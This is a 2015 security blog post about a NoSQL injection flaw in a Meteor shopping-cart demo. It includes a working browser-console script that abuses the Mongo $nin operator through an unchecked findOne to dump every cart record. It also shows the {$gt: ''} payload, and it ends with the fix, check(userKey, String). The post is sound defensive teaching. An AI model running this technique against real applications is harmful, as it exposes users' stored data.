---
layout: post
title:  "Exploiting findOne to Aggregate Collection Data"
titleParts: ["Exploiting findOne", "to Aggregate Collection Data"]
date:   2015-07-21
tags: ["security"]
---

After watching [Rob Conery's](http://rob.conery.io/) awesome [series of screencasts](http://www.pluralsight.com/courses/discussion/meteorjs-web-application) detailing how to build an eCommerce application using [Meteor](https://www.meteor.com/), I was excited to dig into his code. Along with [finding a few other security vulnerabilities](https://github.com/robconery/meteor-shop/pull/1), I had fun playing with an interesting way of exploiting a <code class="language-javascript">findOne</code> query to aggregate data from a Mongo collection.

To get started, take a look at this <code class="language-javascript">getCart</code> method defined in [shopping_cart.js:30-32](https://github.com/robconery/meteor-shop/blob/d667a93ba3a116f1d65534b384099bc9e8230e80/lib/shopping_cart.js#L30-L32):

<pre class="language-javascript"><code class="language-javascript">getCart : function(userKey){
  return Carts.getCart(userKey);
}
</code></pre>

And the corresponding <code class="language-javascript">Carts.getCart</code> method in [carts.js](https://github.com/robconery/meteor-shop/blob/d667a93ba3a116f1d65534b384099bc9e8230e80/lib/collections/carts.js#L3-L25):

<pre class="language-javascript"><code class="language-javascript">Carts.getCart = function(userKey){
  var cart = Carts.findOne({userKey : userKey});
  ...
  return cart;
};
</code></pre>

The first thing you'll notice (I hope) is that the <code class="language-javascript">userKey</code> argument isn't being checked. Your horror may be tempered, though, when you notice that it's being passed into a <code class="language-javascript">findOne</code> query instead of a <code class="language-javascript">find</code>.

What's the worst thing a hacker could do? Sure, they might get a single random Cart by passing in a query like <code class="language-javascript">{$gt: ''}</code>, but it's not like they can get at our whole collection, right?

... Right?!

<hr/>

Well, it turns out you can easily pull down all data from a collection using a <code class="language-javascript">findOne</code> query. Take a look at some code a malicious user could run in their browser's console to do just that:

<pre class="language-javascript"><code class="language-javascript">var carts = [];
function getCartAndSave(userKeys) {
    Meteor.call('getCart', {$nin: userKeys}, function(e, r) {
        if (e || !r || !r._id) {
            return;
        }
        carts.push(r);
        userKeys.push(r.userKey);
        getCartAndSave(userKeys);
    });
}
getCartAndSave(['']);
</code></pre>

And just like that, the entire <code class="language-javascript">carts</code> collection has been pulled down to the client. Let's dig into the code to see what's going on.

The key here is the <code class="language-javascript">$nin</code> [query operator](http://docs.mongodb.org/manual/reference/operator/query/nin/). We begin by calling <code class="language-javascript">getCart</code> and asking for a Cart who's <code class="language-javascript">userKey</code> is not in (<code class="language-javascript">$nin</code>) the array <code class="language-javascript">['']</code>. This will return a random Cart. We push this cart's <code class="language-javascript">userKey</code> onto the array and ask for a Cart who's <code class="language-javascript">userKey</code> is not in that array. This will return another random Cart from the collection that we haven't yet seen. We repeat this process until there are no more Carts to find, and we've aggregated all of the Carts on the client.

Now Mr. Malicious User can take his time perusing your potentially sensitive data.

<hr/>

Like most Meteor security issues, the fix for this is to [check](http://docs.meteor.com/#/full/check) your user-provided arguments:

<pre class="language-javascript"><code class="language-javascript">getCart : function(userKey){
  check(userKey, String);
  return Carts.getCart(userKey);
}
</code></pre>

Now, a malicious user can't pass an object into the <code class="language-javascript">getCart</code> method. They may only pass a String, and will only be able to find a Cart if they know its <code class="language-javascript">userKey</code>.

Never allow users to pass arbitrary data into your queries!
